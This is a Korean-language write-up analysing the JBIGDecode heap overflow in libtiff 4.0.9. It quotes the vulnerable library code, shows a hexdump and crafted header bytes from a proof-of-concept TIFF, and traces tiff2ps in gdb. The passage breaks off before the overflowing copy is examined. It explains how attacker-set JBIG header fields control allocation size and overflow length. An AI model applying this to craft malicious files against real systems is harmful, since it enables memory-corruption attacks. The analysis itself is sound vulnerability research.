@@ -1,0 +1,1474 @@
+			[TeamH4C] libtiff 힙 오버플로 취약점 분석
+
+
+				  	     	      작성자: 정권영
+
+
+
+---[ Contents
+     1. libtiff 4.0.9에서 발견된 취약점
+     2. JBIGDecode 함수
+     	2.1. 메모리 할당 프리미티브
+     	2.2. 메모리 쓰기 프리미티브
+     3. 취약점 트리거 예시: tiff2ps
+     4. libtiff 4.4.0
+     5. References
+
+
+
+
+
+---[ 1. libtiff 4.0.9에서 발견된 취약점
+ [1]은 libtiff 4.0.9을 포함하는 libtiff의 함수 중 하나인 JBIGDecode()이
+임의의 크기를 갖는 JBIG을 buffer 크기를 고려하지 않은 채로 buffer에 저장함을
+확인하였고 (_TIFFmemcpy 함수 부분) 이는 JBIGDecode()가 전달된 size 인자를
+완전히 무시하기 ("(void) size;" 부분) 때문이라고 설명하였다. 그리고 [1]은
+이로부터 발생가능한 공격 프리미티브를 다음 2가지로 정리하였다.
+
+---
+공격 프리미티브
+=======================================================
+1. 공격자는 할당될 메모리 크기를 결정할 수 있다.
+2. 공격자는 상당히 임의적인 크기의 자기가 결정하는 데이터를 이 buffer에
+쓸 수 있다.
+=======================================================
+
+---[ 2. JBIGDecode 함수
+ [1]이 제시한 Vulnerable apps인 libtiff는 JBIGDecode 함수를 다음과 같이
+구현한다.
+
+---
+JBIGDecode 함수
+=======================================================
+static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
+{
+	struct jbg_dec_state decoder;
+	int decodeStatus = 0;
+	unsigned char* pImage = NULL;
+	(void) size, (void) s;
+
+	if (isFillOrder(tif, tif->tif_dir.td_fillorder))
+	{
+		TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize);
+	}
+
+	jbg_dec_init(&decoder);
+
+#if defined(HAVE_JBG_NEWLEN)
+	jbg_newlen(tif->tif_rawdata, (size_t)tif->tif_rawdatasize);
+	/*
+	 * I do not check the return status of jbg_newlen because even if this
+	 * function fails it does not necessarily mean that decoding the image
+	 * will fail.  It is generally only needed for received fax images
+	 * that do not contain the actual length of the image in the BIE
+	 * header.  I do not log when an error occurs because that will cause
+	 * problems when converting JBIG encoded TIFF's to
+	 * PostScript.  As long as the actual image length is contained in the
+	 * BIE header jbg_dec_in should succeed.
+	 */
+#endif /* HAVE_JBG_NEWLEN */
+
+	decodeStatus = jbg_dec_in(&decoder, (unsigned char*)tif->tif_rawdata,
+				  (size_t)tif->tif_rawdatasize, NULL);
+	if (JBG_EOK != decodeStatus)
+	{
+		/*
+		 * XXX: JBG_EN constant was defined in pre-2.0 releases of the
+		 * JBIG-KIT. Since the 2.0 the error reporting functions were
+		 * changed. We will handle both cases here.
+		 */
+		TIFFErrorExt(tif->tif_clientdata,
+			     "JBIG", "Error (%d) decoding: %s",
+			     decodeStatus,
+#if defined(JBG_EN)
+			     jbg_strerror(decodeStatus, JBG_EN)
+#else
+			     jbg_strerror(decodeStatus)
+#endif
+			     );
+		jbg_dec_free(&decoder);
+		return 0;
+	}
+
+	pImage = jbg_dec_getimage(&decoder, 0);
+	_TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
+	jbg_dec_free(&decoder);
+	return 1;
+}
+=======================================================
+
+위 구현에서 size 인자는 "(void) size"로 (코드의 6번째 줄) 인해 완전히
+무시되고, _TIFFmemcpy는 오직 jbg_dec_getsize()에 의존하여 데이터를
+buffer로 복사한다. 이때 _TIFFmemcpy는 buffer가 충분한 크기를 가진 메모리라고
+가정한다.
+
+---[ 2.1. jbg_dec_getsize 함수
+ [1]이 제시한 JBIGDecode()의 코드에서 문제가 되는 _TIFFmemcpy 함수는 [1]이
+제시한 Vulnerable App (https://www.exploit-db.com/apps/
+54bad211279cc93eb4fca31ba9bfdc79-tiff-4.0.9.tar.gz)에서 다음과 같이
+구현됨을 확인할 수 있다.
+
+---
+_TIFFmemcpy 함수
+=======================================================
+void
+_TIFFmemcpy(void* d, const void* s, tmsize_t c)
+{
+	memcpy(d, s, (size_t) c);
+}
+=======================================================
+
+위 구현으로부터 _TIFFmemcpy 함수가 memcpy 함수에 대한 wrapper 함수임을
+알 수 있다. 따라서 JBIGDecode()는 jbg_dec_getsize 함수가 리턴하는 값만큼의
+데이터를 buffer에 저장하게 된다. 이때 [2]는 jbg_dec_getsize 함수와 관련
+코드를 다음과 같이 구현한다.
+
+---
+jbg_dec_getsize 함수 관련 코드
+=======================================================
+/*
+ * Calculate y = ceil(x/2) applied n times, which is equivalent to
+ * y = ceil(x/(2^n)). This function is used to
+ * determine the number of pixels per row or column after n resolution
+ * reductions. E.g. X[d-1] = jbg_ceil_half(X[d], 1) and X[0] =
+ * jbg_ceil_half(X[d], d) as defined in clause 6.2.3 of T.82.
+ */
+unsigned long jbg_ceil_half(unsigned long x, int n)
+{
+  unsigned long mask;
+  
+  assert(n >= 0 && n < 32);
+  mask = (1UL << n) - 1;     /* the lowest n bits are 1 here */
+  return (x >> n) + ((mask & x) != 0);
+}
+...
+/*
+ * After jbg_dec_in() returned JBG_EOK or JBG_EOK_INTR, you can call
+ * this function in order to find out the size in bytes of one
+ * bitplane of the image.
+ */
+long jbg_dec_getsize(const struct jbg_dec_state *s)
+{
+  if (s->d < 0)
+    return -1;
+  if (iindex[s->order & 7][LAYER] == 0) {
+    if (s->ii[0] < 1)
+      return -1;
+    else
+      return 
+	jbg_ceil_half(s->xd, s->d - (s->ii[0] - 1) + 3) *
+	jbg_ceil_half(s->yd, s->d - (s->ii[0] - 1));
+  }
+  
+  return jbg_ceil_half(s->xd, 3) * s->yd;
+}
+=======================================================
+
+위 구현으로부터 _TIFFmemcpy()가 buffer에 저장하는 데이터의 크기는
+jbg_dec_state 구조체의 d, order, xd, yd, ii[0] 멤버변수의 값에 따라 달라지게
+된다. 따라서 이 필드들이 어떻게 값을 가지게 되는지 확인할 필요가 있다. 이들의
+값은 jbg_dec_in 함수에서 정해지는데 이 함수는 이들 외에도 많은 멤버변수의
+값을 정하므로 상기의 멤버변수에 대한 부분만 살펴볼 것이다. 이는 [2]가 다음과
+같이 구현하는 것이다.
+
+---
+jbg_dec_in 함수 관련 코드 (필요할 부분만 발췌)
+=======================================================
+/* loop array indices */
+#define STRIPE  0
+#define LAYER   1
+#define PLANE   2
+...
+/*
+ * the following array specifies for each combination of the 3
+ * ordering bits, which ii[] variable represents which dimension
+ * of s->sde.
+ */
+static const int iindex[8][3] = {
+  { 2, 1, 0 },    /* no ordering bit set */
+  { -1, -1, -1},  /* SMID -> illegal combination */
+  { 2, 0, 1 },    /* ILEAVE */
+  { 1, 0, 2 },    /* SMID + ILEAVE */
+  { 0, 2, 1 },    /* SEQ */
+  { 1, 2, 0 },    /* SEQ + SMID */
+  { 0, 1, 2 },    /* SEQ + ILEAVE */
+  { -1, -1, -1 }  /* SEQ + SMID + ILEAVE -> illegal combination */
+};
+...
+/*
+ * Provide a new BIE fragment to the decoder.
+ *
+ * If cnt is not NULL, then *cnt will contain after the call the
+ * number of actually read bytes. If the data was not complete, then
+ * the return value will be JBG_EAGAIN and *cnt == len. In case this
+ * function has returned with JBG_EOK, then it has reached the end of
+ * a BIE but it can be called again with data from the next BIE if
+ * there exists one in order to get to a higher resolution layer. In
+ * case the return value was JBG_EOK_INTR then this function can be
+ * called again with the rest of the BIE, because parsing the BIE has
+ * been interrupted by a jbg_dec_maxsize() specification. In both
+ * cases the remaining len - *cnt bytes of the previous block will
+ * have to passed to this function again (if len > *cnt). In case of
+ * any other return value than JBG_EOK, JBG_EOK_INTR or JBG_EAGAIN, a
+ * serious problem has occured and the only function you should call
+ * is jbg_dec_free() in order to remove the mess (and probably
+ * jbg_strerror() in order to find out what to tell the user).
+ */
+int jbg_dec_in(struct jbg_dec_state *s, unsigned char *data, size_t len,
+	       size_t *cnt)
+{
+  int i, j, required_length;
+  unsigned long x, y;
+  unsigned long is[3], ie[3];
+  extern char jbg_dptable[];
+  size_t dummy_cnt;
+
+  if (!cnt) cnt = &dummy_cnt;
+  *cnt = 0;
+  if (len < 1) return JBG_EAGAIN;
+...
+  /* read in 20-byte BIH */
+  if (s->bie_len < 20) {
+    while (s->bie_len < 20 && *cnt < len)
+      s->buffer[s->bie_len++] = data[(*cnt)++];
+    if (s->bie_len < 20) 
+      return JBG_EAGAIN;
+    if (s->buffer[1] < s->buffer[0])
+      return JBG_EINVAL;
+    /* test whether this looks like a valid JBIG header at all */
+    if (s->buffer[3] != 0 || (s->buffer[18] & 0xf0) != 0 ||
+	(s->buffer[19] & 0x80) != 0)
+      return JBG_EINVAL;
+    if (s->buffer[0] != s->d + 1)
+      return JBG_ENOCONT;
+    s->dl = s->buffer[0];  
+    s->d = s->buffer[1];
+...
+    x = (((long) s->buffer[ 4] << 24) | ((long) s->buffer[ 5] << 16) |
+	 ((long) s->buffer[ 6] <<  8) | (long) s->buffer[ 7]);
+    y = (((long) s->buffer[ 8] << 24) | ((long) s->buffer[ 9] << 16) |
+	 ((long) s->buffer[10] <<  8) | (long) s->buffer[11]);
+...
+    s->xd = x;
+    s->yd = y;
+...
+    s->order = s->buffer[18];
+...
+    /* some initialization */
+    s->ii[iindex[s->order & 7][STRIPE]] = 0;
+    s->ii[iindex[s->order & 7][LAYER]] = s->dl;
+    s->ii[iindex[s->order & 7][PLANE]] = 0;
+...
+  	/* increment layer/stripe/plane loop variables */
+	/* start and end value for each loop: */
+	is[iindex[s->order & 7][STRIPE]] = 0;
+	ie[iindex[s->order & 7][STRIPE]] = s->stripes - 1;
+	is[iindex[s->order & 7][LAYER]] = s->dl;
+	ie[iindex[s->order & 7][LAYER]] = s->d;
+	is[iindex[s->order & 7][PLANE]] = 0;
+	ie[iindex[s->order & 7][PLANE]] = s->planes - 1;
+	i = 2;  /* index to innermost loop */
+	do {
+	  j = 0;  /* carry flag */
+	  if (++s->ii[i] > ie[i]) {
+	    /* handling overflow of loop variable */
+	    j = 1;
+	    if (i > 0)
+	      s->ii[i] = is[i];
+	  }
+	} while (--i >= 0 && j);
+...
+}
+=======================================================
+
+위 구현을 살펴보면 ii[0] 멤버변수를 제외하고는 모두 s->buffer로부터 값을
+얻고 있고, s->buffer가 바로 JBIG 파일의 헤더임을 알 수 있다. 이때 ii[0]의
+값은 s->order에 의존하므로 이 값이 정해져야 알 수 있다. 이는 _TIFFmemcpy()가
+buffer에 저장하는 데이터의 크기를 결정하는 변수들이 모두 JBIG 파일 헤더에
+있음을 의미한다.
+
+ 여기서 [1]이 제시하는 예시 TIFF 파일을 살펴보자. 이는 base64로 인코딩되어
+있으므로 디코딩을 해야 올바른 데이터를 볼 수 있다. 그 결과의 일부는 다음과
+같다.
+
+---
+예시 TIFF 파일 base64 디코딩의 hexdump 결과
+=======================================================
+00000000  49 49 2a 00 48 18 00 00  32 30 30 31 3a 31 31 3a  |II*.H...2001:11:|
+00000010  32 37 20 32 31 3a 34 30  3a 32 38 00 38 00 00 00  |27 21:40:28.8...|
+00000020  01 00 00 00 38 00 00 00  00 01 00 00 00 00 01 00  |....8...........|
+00000030  00 00 bc b8 00 00 00 01  00 00 00 02 08 00 03 1c  |................|
+00000040  d2 a4 d2 71 f2 e8 26 c9  85 5a 23 6e c6 14 65 8f  |...q..&..Z#n..e.|
+00000050  2f 67 e2 dc 44 72 82 b4  58 ef 01 c2 49 63 e2 62  |/g..Dr..X...Ic.b|
+00000060  6d 91 19 b9 d1 5e a6 98  a3 9a 8e 8a e6 b4 08 0a  |m....^..........|
+00000070  77 78 67 5c e9 d9 b1 e0  31 ed 09 37 2c e9 29 8e  |wxg\....1..7,.).|
+00000080  b0 ff 00 38 15 16 c1 99  5d 5c fa 7a 99 9d 39 39  |...8....]\.z..99|
+00000090  94 7e 29 9c cd b1 df c9  11 e7 08 9d 1d b6 52 66  |.~)...........Rf|
+...
+=======================================================
+
+위 파일은 TIFF로 압축된 JBIG 파일이므로 두 개의 헤더가 존재한다. 이때 TIFF
+헤더는 [1]이 제시한 C 코드로부터 다음과 같음을 알 수 있다.
+
+---
+TIFF 헤더 예시
+=======================================================
+...
+  // Write the hacky TIF header.
+  unsigned char buf[] = {
+    0x49, 0x49, // Identifier.
+    0x2A, 0x00, // Version.
+    0xCA, 0x03, 0x00, 0x00, // First IFD offset.
+    0x32, 0x30, 0x30, 0x31,
+    0x3a, 0x31, 0x31, 0x3a,
+    0x32, 0x37, 0x20, 0x32,
+    0x31, 0x3a, 0x34, 0x30,
+    0x3a, 0x32, 0x38, 0x00,
+    0x38, 0x00, 0x00, 0x00,
+    0x01, 0x00, 0x00, 0x00,
+    0x38, 0x00, 0x00, 0x00,
+    0x00, 0x01, 0x00, 0x00
+  };
+...
+=======================================================
+
+따라서 TIFF의 헤더는 길이 44가 되고 이에 뒤따르는 데이터가 JBIG의 헤더가
+된다. 그럼 이제 예시 TIFF 파일의 JBIG 크기를 jbg_dec_getsize()를 따라
+계산해보자. 먼저 _TIFFmemcpy 함수에서 크기 인자를 결정하는 변수들의 값을
+계산하면 다음과 같다. (jbg_dec_in 함수가 s->ii[0]의 값을 증가시킨다는
+것에 주의하자)
+
+---
+예시 TIFF 파일에서 크기 인자를 결정하는 변수의 값
+=======================================================
+s->d = s->buffer[1] = 0x00
+s->xd = (((long) s->buffer[ 4] << 24) | ((long) s->buffer[ 5] << 16) |
+	 ((long) s->buffer[ 6] <<  8) | (long) s->buffer[ 7])
+      = 0xbcb8
+s->yd = (((long) s->buffer[ 8] << 24) | ((long) s->buffer[ 9] << 16) |
+	 ((long) s->buffer[10] <<  8) | (long) s->buffer[11])
+      = 0x1
+s->order = s->buffer[18] = 0x3
+s->ii[iindex[s->order & 7][LAYER]] s->ii[0] = s->dl => ++s->ii[0] = 0x1
+=======================================================
+
+위 결과를 jbg_dec_getsize()에 대입하면 다음과 같이 계산됨을 알 수 있다.
+
+=======================================================
+jbg_ceil_half(0xbcb8, 0x00 - (0x1 - 1) + 3) = jbg_ceil_half(0xbcb8, 3)
+                                            = 0x1797 (=6039)
+jbg_ceil_half(0x1, 0x00 - (0x1 - 1)) = jbg_ceil_half(0x1, 0)
+                                     = 0x1
+ => 0x1797 * 0x1 = 0x1797
+=======================================================
+
+따라서 헤더의 이 필드들을 조작하여 jbg_dec_getsize()가 리턴할 크기를 조정할
+수 있다.
+
+ 여기서 jbg_dec_in()을 좀 더 살펴보면 아래에 매우 많은 malloc 계열 함수를
+볼 수 있다. 이에 대해 [2]가 구현하는 jbg_dec_in()의 해당 부분 관련 코드는
+다음과 같다.
+
+---
+jbg_dec_in 함수 관련 코드(malloc 부분 발췌)
+=======================================================
+static void *checked_malloc(size_t nmemb, size_t size)
+{
+  void *p;
+
+  /* Full manual exception handling is ugly here for performance
+   * reasons. If an adequate handling of lack of memory is required,
+   * then use C++ and throw a C++ exception instead of abort(). */
+
+  /* assert that nmemb * size <= SIZE_MAX */
+  if (size > SIZE_MAX / nmemb)
+    abort();
+  
+  p = malloc(nmemb * size);
+
+  if (!p)
+    abort();
+
+#if 0
+  fprintf(stderr, "%p = malloc(%lu * %lu)\n", p,
+	  (unsigned long) nmemb, (unsigned long) size);
+#endif
+
+  return p;
+}
+
+int jbg_dec_in(struct jbg_dec_state *s, unsigned char *data, size_t len,
+	       size_t *cnt)
+{
+ int i, j, required_length;
+  unsigned long x, y;
+  unsigned long is[3], ie[3];
+  extern char jbg_dptable[];
+  size_t dummy_cnt;
+
+  if (!cnt) cnt = &dummy_cnt;
+  *cnt = 0;
+  if (len < 1) return JBG_EAGAIN;
+
+  /* read in 20-byte BIH */
+  if (s->bie_len < 20) {
+...  
+    if (s->dl == 0) {
+      s->s      = (struct jbg_ardec_state **)
+	checked_malloc(s->planes, sizeof(struct jbg_ardec_state *));
+      s->tx     = (int **) checked_malloc(s->planes, sizeof(int *));
+      s->ty     = (int **) checked_malloc(s->planes, sizeof(int *));
+      s->reset  = (int **) checked_malloc(s->planes, sizeof(int *));
+      s->lntp   = (int **) checked_malloc(s->planes, sizeof(int *));
+      s->lhp[0] = (unsigned char **)
+	checked_malloc(s->planes, sizeof(unsigned char *));
+      s->lhp[1] = (unsigned char **)
+	checked_malloc(s->planes, sizeof(unsigned char *));
+      for (i = 0; i < s->planes; i++) {
+	s->s[i]     = (struct jbg_ardec_state *)
+	  checked_malloc(s->d - s->dl + 1, sizeof(struct jbg_ardec_state));
+	s->tx[i]    = (int *) checked_malloc(s->d - s->dl + 1, sizeof(int));
+	s->ty[i]    = (int *) checked_malloc(s->d - s->dl + 1, sizeof(int));
+	s->reset[i] = (int *) checked_malloc(s->d - s->dl + 1, sizeof(int));
+	s->lntp[i]  = (int *) checked_malloc(s->d - s->dl + 1, sizeof(int));
+	s->lhp[ s->d    & 1][i] = (unsigned char *)
+	  checked_malloc(s->yd, jbg_ceil_half(s->xd, 3));
+	s->lhp[(s->d-1) & 1][i] = (unsigned char *)
+	  checked_malloc(jbg_ceil_half(s->yd, 1), jbg_ceil_half(s->xd, 1+3));
+      }
+    } else {
+      for (i = 0; i < s->planes; i++) {
+	s->s[i]     = (struct jbg_ardec_state *)
+	  checked_realloc(s->s[i], s->d - s->dl + 1,
+			  sizeof(struct jbg_ardec_state));
+	s->tx[i]    = (int *) checked_realloc(s->tx[i],
+					      s->d - s->dl + 1, sizeof(int));
+	s->ty[i]    = (int *) checked_realloc(s->ty[i],
+					      s->d - s->dl + 1, sizeof(int));
+	s->reset[i] = (int *) checked_realloc(s->reset[i],
+					      s->d - s->dl + 1, sizeof(int));
+	s->lntp[i]  = (int *) checked_realloc(s->lntp[i],
+					      s->d - s->dl + 1, sizeof(int));
+	s->lhp[ s->d    & 1][i] = (unsigned char *)
+	  checked_realloc(s->lhp[ s->d    & 1][i],
+			  s->yd, jbg_ceil_half(s->xd, 3));
+	s->lhp[(s->d-1) & 1][i] = (unsigned char *)
+	  checked_realloc(s->lhp[(s->d-1) & 1][i],
+			  jbg_ceil_half(s->yd, 1), jbg_ceil_half(s->xd, 1+3));
+      }
+    }
+...
+  }
+...
+}
+=======================================================
+
+앞의 예시에서 s->dl = 0이었으므로 if 블록에 진입하게 된다. 여기서 관심가져야
+할 부분은 if 블록의 for 블록 안에 있는 s->lhp[ s->d    & 1][i]에
+checked_malloc 함수로 할당한 메모리 주소를 저장하는 부분이다. 이때
+메모리 할당 함수에 전달되는 인자와 함수의 구현을 보면 앞에서 구한 크기의
+메모리를 할당하고 있음을 알 수 있다. 즉, 상기의 멤버변수들로 할당될 메모리의
+크기가 결정된다는 것이다. 따라서 공격자는 상기의 헤더 필드들을 조작하여 할당될
+메모리의 크기를 정할 수 있다.
+
+ 정리하면, jbg_dec_getsize()가 리턴하는 값은 JBIG 헤더의 특정 필드들에
+의해 결정되고, jbg_dec_in()에서 그 값만큼의 크기를 갖는 메모리를 할당하므로
+jbg_dec_in()은 메모리 할당 프리미티브가 될 수 있다.
+
+---[ 2.2. 메모리 쓰기 프리미티브
+ 2.1.에서 jbg_dec_getsize()의 리턴값이 헤더의 특정 필드에 의해 결정된다는
+것과 JBIGDecode()가 호출하는 jbg_dec_in()의 동작에 따라 jbg_dec_in()이
+메모리 할당 프리미티브가 될 수 있음을 설명하였다.
+
+ 이때 _TIFFmemcpy()는 그 구현으로부터 pImage에 저장된 데이터를 buffer로
+복사한다. 그런데 그 크기가 jbg_dec_getsize()에 의해 정해지고, pImage에
+저장된 데이터도 사용자가 제공한 파일의 데이터에 대한 디코딩 결과이므로
+공격자는 buffer가 가리키는 주소 이후의 주소에 대해서는 원하는 크기만큼의
+원하는 데이터를 (다만, 디코딩 규칙을 따라야 한다) 쓸 수 있게 된다. 여기서
+문제는 buffer의 크기가 전혀 고려되지 않는다는 것이다.
+
+---
+_TIFFmemcpy 함수
+=======================================================
+void
+_TIFFmemcpy(void* d, const void* s, tmsize_t c)
+{
+	memcpy(d, s, (size_t) c);
+}
+=======================================================
+
+ 정리하면, _TIFFmemcpy()는 (조작 여부에 상관없이) 특정 헤더 필드에 의해
+정해진 크기의 (입력 파일 데이터에 대한) 디코딩 데이터를 buffer에 쓰므로
+메모리 쓰기 프리미티브가 될 수 있다.
+
+---[ 3. 취약점 트리거 예시: tiff2ps
+ 이제 실제 프로그램에서 취약점이 어떻게 트리거되는지 살펴보자. [1]이 제시한
+Vulnerable apps인 libtiff는 몇 가지 tools를 제공한다. 여기에는 tiff2ps,
+tiffinfo, tiffdump 등이 있다. 여기서는 tiff2ps에서 상기 서술한 메모리
+할당, 쓰기 프리미티브가 어떻게 동작하는지 확인해볼 것이다.
+
+ 먼저 libtiff의 TIFFReadEncodedStrip 구현을 살펴보자.
+
+---
+TIFFReadEncodedStrip 함수 (tif_decodestrip 부분 발췌)
+=======================================================
+/*
+ * Read a strip of data and decompress the specified
+ * amount into the user-supplied buffer.
+ */
+tmsize_t
+TIFFReadEncodedStrip(TIFF* tif, uint32 strip, void* buf, tmsize_t size)
+{
+	static const char module[] = "TIFFReadEncodedStrip";
+	TIFFDirectory *td = &tif->tif_dir;
+	tmsize_t stripsize;
+	uint16 plane;
+...
+	if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+		return((tmsize_t)(-1));
+...
+}
+=======================================================
+
+위 구현을 보면 tif의 tif_decodestrip이라는 멤버함수가 호출됨을 확인할
+수 있다. JBIG의 경우에는 TIFFInitJBIG 함수에서 JBIGDecode 함수의 주소로
+설정된다. 여기서는 입력 파일로 [1]이 제시한 예시 tiff 파일을 줄 것이고
+이는 JBIG을 TIFF로 압축한 파일이므로 tif_decodestrip 멤버는 JBIGDecode
+함수로 설정될 것이다.
+
+ 이제 gdb에서 tiff2ps를 디버깅해보자. 먼저 TIFFReadEncodedStrip 함수에
+중지점을 걸고 실행한다. 여기서 [1]이 제시한 예시 tiff 파일의 이름은
+foo.tiff라고 가정한다.
+
+=======================================================
+ubuntu@ubuntu-virtual-machine:~/Downloads$ gdb tiff2ps
+GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+	<http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from tiff2ps...
+(gdb) break TIFFReadEncodedStrip
+Breakpoint 1 at 0x2510
+(gdb) r foo.tiff output.tiff
+Starting program: /usr/local/bin/tiff2ps foo.tiff output.tiff
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+TIFFReadDirectoryCheckOrder: Warning, Invalid TIFF directory; tags are not sorted in ascending order.
+%!PS-Adobe-3.0 EPSF-3.0
+%%Creator: tiff2ps
+%%Title: foo.tiff
+%%CreationDate: Sun Jul 10 20:33:39 2022
+%%DocumentData: Clean7Bit
+%%Origin: 0 0
+%%BoundingBox: 0 0 193 150
+%%LanguageLevel: 1
+%%Pages: 1 1
+%%EndComments
+%%Page: 1 1
+gsave
+100 dict begin
+192.857147 150.000000 scale
+%ImageData: 150 150 1 1 0 1 2 "image"
+/scanLine 19 string def
+150 150 1
+[150 0 0 -150 0 150]
+{currentfile scanLine readhexstring pop} bind
+image
+
+Breakpoint 1, TIFFReadEncodedStrip (tif=tif@entry=0x5555555642a0, strip=strip@entry=0, buf=buf@entry=0x5555555654c0, size=size@entry=2850) at tif_read.c:508
+508    {
+(gdb)
+=======================================================
+
+여기서 TIFFReadEncodedStrip의 구현을 보면 buf 인자를 그대로
+tif_decodestrip에 전달하고 있음을 알 수 있다. 이 buf 인자는 JBIGDecode
+함수에서 buffer 인자가 된다. 따라서 이 인자가 어느 정도의 크기로 할당되었는지
+알 필요가 있고 이를 위해서는 TIFFReadEncodedStrip 함수의 호출자를 알아야
+한다.
+
+=======================================================
+gdb) bt
+#0  TIFFReadEncodedStrip (tif=tif@entry=0x5555555642a0, strip=strip@entry=0,
+	buf=buf@entry=0x5555555654c0, size=size@entry=2850) at tif_read.c:508
+#1  0x000055555555c591 in PSDataBW (
+	fd=fd@entry=0x7ffff7e4d780 <_IO_2_1_stdout_>,
+	tif=tif@entry=0x5555555642a0, w=w@entry=150, h=h@entry=150)
+	at tiff2ps.c:2664
+#2  0x000055555555caf2 in PSpage (fd=0x7ffff7e4d780 <_IO_2_1_stdout_>,
+	tif=0x5555555642a0, w=150, h=150) at tiff2ps.c:2394
+#3  0x000055555555d7cd in TIFF2PS (
+	fd=fd@entry=0x7ffff7e4d780 <_IO_2_1_stdout_>,
+	tif=tif@entry=0x5555555642a0, pgwidth=pgwidth@entry=0,
+	pgheight=pgheight@entry=0, lm=lm@entry=0, bm=bm@entry=0,
+	center=center@entry=0) at tiff2ps.c:1612
+#4  0x0000555555556be9 in main (argc=3, argv=0x7fffffffdfe8) at tiff2ps.c:479
+(gdb)
+=======================================================
+
+위 결과로부터 PSDataBW 함수가 호출자임을 알 수 있다. 이 함수의 구현은 다음과
+같다.
+
+---
+PSDataBW 함수 (관련 부분 발췌)
+=======================================================
+void
+PSDataBW(FILE* fd, TIFF* tif, uint32 w, uint32 h)
+{
+	int breaklen = MAXLINE;
+	unsigned char* tf_buf;
+	unsigned char* cp;
+	tsize_t stripsize = TIFFStripSize(tif);
+	tstrip_t s;
+...
+	tf_buf = (unsigned char *) _TIFFmalloc(stripsize);
+	if (tf_buf == NULL) {
+		TIFFError(filename, "No space for scanline buffer");
+		return;
+	}
+...
+	for (s = 0; s < TIFFNumberOfStrips(tif); s++) {
+		tmsize_t cc = TIFFReadEncodedStrip(tif, s, tf_buf, stripsize);
+...
+	}
+...
+	_TIFFfree(tf_buf);
+}
+=======================================================
+
+PSDataBW 함수의 구현에 의해 tf_buf에 pImage의 데이터가 복사되고 그 크기는
+stripsize가 된다. 이제 다시 TIFFReadEncodedStrip 함수로 돌아가서
+tif_decodestrip에 중지점을 걸고 이 함수로 진입하여 어떤 디코딩 함수로
+연결되는지 살펴보자.
+
+=======================================================
+gdb) list
+503     * Read a strip of data and decompress the specified
+504     * amount into the user-supplied buffer.
+505     */
+506    tmsize_t
+507    TIFFReadEncodedStrip(TIFF* tif, uint32 strip, void* buf, tmsize_t size)
+508    {
+509   	 static const char module[] = "TIFFReadEncodedStrip";
+510   	 TIFFDirectory *td = &tif->tif_dir;
+511   	 tmsize_t stripsize;
+512   	 uint16 plane;
+(gdb)
+513    
+514   	 stripsize=TIFFReadEncodedStripGetStripSize(tif, strip, &plane);
+515   	 if (stripsize==((tmsize_t)(-1)))
+516   		 return((tmsize_t)(-1));
+517    
+518    	/* shortcut to avoid an extra memcpy() */
+519    	if( td->td_compression == COMPRESSION_NONE &&
+520        	size!=(tmsize_t)(-1) && size >= stripsize &&
+521        	!isMapped(tif) &&
+522        	((tif->tif_flags&TIFF_NOREADRAW)==0) )
+(gdb)
+523    	{
+524        	if (TIFFReadRawStrip1(tif, strip, buf, stripsize, module) != stripsize)
+525            	return ((tmsize_t)(-1));
+526    
+527        	if (!isFillOrder(tif, td->td_fillorder) &&
+528            	(tif->tif_flags & TIFF_NOBITREV) == 0)
+529            	TIFFReverseBits(buf,stripsize);
+530    
+531        	(*tif->tif_postdecode)(tif,buf,stripsize);
+532        	return (stripsize);
+(gdb)
+533    	}
+534    
+535   	 if ((size!=(tmsize_t)(-1))&&(size<stripsize))
+536   		 stripsize=size;
+537   	 if (!TIFFFillStrip(tif,strip))
+538   		 return((tmsize_t)(-1));
+539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+540   		 return((tmsize_t)(-1));
+541   	 (*tif->tif_postdecode)(tif,buf,stripsize);
+542   	 return(stripsize);
+(gdb)
+543    }
+544    
+545    /* Variant of TIFFReadEncodedStrip() that does
+546     * * if *buf == NULL, *buf = _TIFFmalloc(bufsizetoalloc) only after TIFFFillStrip() has
+547     *   succeeded. This avoid excessive memory allocation in case of truncated
+548     *   file.
+549     * * calls regular TIFFReadEncodedStrip() if *buf != NULL
+550     */
+551    tmsize_t
+552    _TIFFReadEncodedStripAndAllocBuffer(TIFF* tif, uint32 strip,
+(gdb) break 539
+Breakpoint 2 at 0x7ffff7f79e8d: file tif_read.c, line 539.
+(gdb) cont
+Continuing.
+
+Breakpoint 2, TIFFReadEncodedStrip (tif=tif@entry=0x5555555642a0, strip=strip@entry=0, buf=buf@entry=0x5555555654c0, size=size@entry=2850) at tif_read.c:539
+539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+(gdb) stepi
+0x00007ffff7f79e92    539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+(gdb)
+0x00007ffff7f79e95    539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+(gdb)
+0x00007ffff7f79e98    539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+(gdb)
+0x00007ffff7f79e9b    539   	 if ((*tif->tif_decodestrip)(tif,buf,stripsize,plane)<=0)
+(gdb)
+JBIGDecode (tif=0x5555555642a0, buffer=0x5555555654c0 "", size=2850, s=0) at tif_jbig.c:52
+52    {
+(gdb)
+=======================================================
+
+위 결과를 보면 앞서 예상했던 것과 같이 JBIGDecode 함수로 연결됨을 알 수 있다.
+그리고 TIFFReadEncodedStrip에서 계산한 stripsize가 2850이라는 것도 확인할
+수 있다. 물론 앞서 살펴보았듯이 이는 아무런 역할도 수행하지 않는다. 이제
+_TIFFmemcpy 함수에 중지점을 걸고 데이터가 복사되기 이전 상황을 살펴보자.
+
